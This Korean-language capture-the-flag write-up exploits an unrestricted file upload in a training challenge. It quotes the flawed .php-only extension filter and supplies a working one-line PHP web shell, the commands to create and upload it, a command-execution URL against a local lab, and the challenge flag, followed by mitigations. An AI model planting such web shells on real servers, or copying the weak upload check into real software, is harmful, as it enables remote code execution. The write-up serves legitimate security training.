# [server] File Upload → 웹쉘 라이트업

- 대상: `arang-edu-challs-collection` / `challenges/server/upload-webshell`
- 카테고리: server
- 버그클래스: Unrestricted File Upload → RCE
- 포트: 9501

## 취약점 분석

`challenges/server/upload-webshell/html/index.php`:

```php
$name = basename($_FILES['f']['name']);
// 허술한 확장자 검사: .php 만 차단 (.phtml/.php5/대소문자 우회 가능)
if (preg_match('/\.php$/i', $name)) { echo "php 금지!"; }
else {
    move_uploaded_file($_FILES['f']['tmp_name'], "$dir/$name");
    echo "업로드됨: <a href='uploads/$name'>uploads/$name</a>";
}
```

확장자가 정확히 `.php`(대소문자 무관)로 끝나는 경우만 차단한다. `.phtml`, `.php5` 등은 걸러지지 않는다. 그리고 Dockerfile에서 Apache가 `.phtml`/`.php5` 확장자도 PHP로 실행하도록 별도 설정되어 있다.

```
RUN printf '<FilesMatch "\.(phtml|php5)$">\n  SetHandler application/x-httpd-php\n</FilesMatch>\n' \
        > /etc/apache2/conf-enabled/phtml-exec.conf
```

즉 `.phtml` 파일을 업로드하면 그대로 PHP 코드로 실행되는 전형적인 파일 업로드 RCE다. flag는 `/flag_upload.txt`에 있으며 웹쉘로 읽어야 한다.

## 익스플로잇

1. 웹쉘 파일 작성:
```php
<?php system($_GET[0]); ?>
```
파일명은 `.php`가 아닌 실행 가능한 확장자, 예: `shell.phtml`

```bash
echo '<?php system($_GET[0]); ?>' > shell.phtml
```

2. 업로드 페이지(`http://localhost:9501`)에서 `shell.phtml` 업로드 → 차단 없이 `uploads/shell.phtml`에 저장됨

3. 웹쉘 접속 및 명령 실행:
```
http://localhost:9501/uploads/shell.phtml?0=cat /flag_upload.txt
```
`$_GET[0]`가 `system()`에 그대로 전달되어 임의 명령 실행, flag 파일 내용이 응답에 출력된다.

## 진행 절차

1. `docker compose up -d --build upload-webshell db`
2. `shell.phtml` 생성 (내용: `<?php system($_GET[0]); ?>`)
3. `http://localhost:9501` 에서 해당 파일 업로드
4. `http://localhost:9501/uploads/shell.phtml?0=cat /flag_upload.txt` 접속 → flag 확인

## 플래그

```
flag{86e68319c87ea666304a}
```

## 대응방안

- 확장자는 블랙리스트가 아닌 화이트리스트(허용 목록: jpg, png 등)로 검증
- 업로드 디렉터리는 스크립트 실행 권한 자체를 제거(웹서버 설정에서 해당 경로의 PHP/CGI 핸들러 비활성화)
- 파일 내용(매직 바이트/실제 포맷)까지 검증해 확장자 위장을 방지
- 업로드 파일명은 랜덤하게 재생성해 예측/직접 접근을 어렵게 함
- 업로드 파일은 별도 정적 파일 서버/오브젝트 스토리지 등 애플리케이션 서버와 분리된 위치에 저장
